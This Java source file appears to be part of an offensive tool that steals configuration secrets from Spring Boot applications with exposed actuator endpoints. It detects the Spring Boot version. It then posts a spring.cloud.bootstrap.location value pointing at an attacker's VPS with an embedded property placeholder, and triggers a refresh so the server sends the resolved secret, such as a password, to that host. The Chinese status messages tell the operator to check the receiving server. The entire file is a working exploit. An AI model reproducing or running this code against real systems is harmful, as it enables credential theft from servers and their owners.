package src.main.module;

import src.main.impl.ResultCallback;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class GetSpPassWord_III {
    private final String address;
    private final String vpsIP;
    private final String vpsPORT;
    private final String args;
    public String text;
    public GetSpPassWord_III(String address,String vpsIP,String vpsPORT,String args){
        this.address = address;
        this.vpsIP = vpsIP;
        this.vpsPORT = vpsPORT;
        this.args = args;
    }
    public void Result1(ResultCallback callback){
        String api = "/env";
        String refapi = "/refresh";
        String site = address + api;
        String refsite = address +refapi;
        String expdata = "spring.cloud.bootstrap.location=http://%s/?=${%s}";
        String data = String.format(expdata,vpsIP+":"+vpsPORT,args);
        try{
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
            conn.setDoOutput(true);
            try(OutputStream os = conn.getOutputStream()){
                byte[] input  = data.getBytes(StandardCharsets.UTF_8);
                os.write(input,0,input.length);
            }
            int responseCode = conn.getResponseCode();
            if(responseCode == HttpURLConnection.HTTP_OK){
                URL obj1 = new URL(refsite);
                HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                conn1.setRequestMethod("POST");
                conn1.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                conn1.setDoOutput(true);
                int responseCode1 = conn1.getResponseCode();
                if (responseCode1 == HttpURLConnection.HTTP_OK){
                    text = "请求成功！请在你的反弹服务器上查看";
                    callback.onResult(text);
                }else{
                    text = "发送请求失败！";
                    callback.onResult(text);
                }
            }else {
                text = "发送请求失败！";
                callback.onResult(text);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public void Result2(ResultCallback callback){
        String api = "/actuator/env";
        String refapi = "/actuator/refresh";
        String site = address + api;
        String refsite = address +refapi;
        String expdata = "{\"name\":\"spring.cloud.bootstrap.location\",\"value\":\"http://%s/?=${%s}\"}";
        String data = String.format(expdata,vpsIP+":"+vpsPORT,args);
        try {
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = data.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK){
                URL obj1 = new URL(refsite);
                HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                conn1.setRequestMethod("POST");
                conn1.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                conn1.setDoOutput(true);
                int responseCode1 = conn1.getResponseCode();
                if (responseCode1 == HttpURLConnection.HTTP_OK){
                    text = "请求成功！请在你的反弹服务器上查看";
                    callback.onResult(text);
                }else{
                    text = "发送请求失败！";
                    callback.onResult(text);
                }
            }else{
                text = "发送请求失败！";
                callback.onResult(text);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public void Exp(ResultCallback callback) throws IOException {
        String site = address + "/env";
        URL obj = new URL(site);
        HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
        conn.setRequestMethod("GET");
        int responseCode = conn.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK){
            callback.onResult("当前版本为springboot1");
            Result1(callback);
        }else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND){
            callback.onResult("当前版本为springboot2");
            Result2(callback);
        }else{
            callback.onResult("无法确认springboot版本，请重试");
        }
    }
}
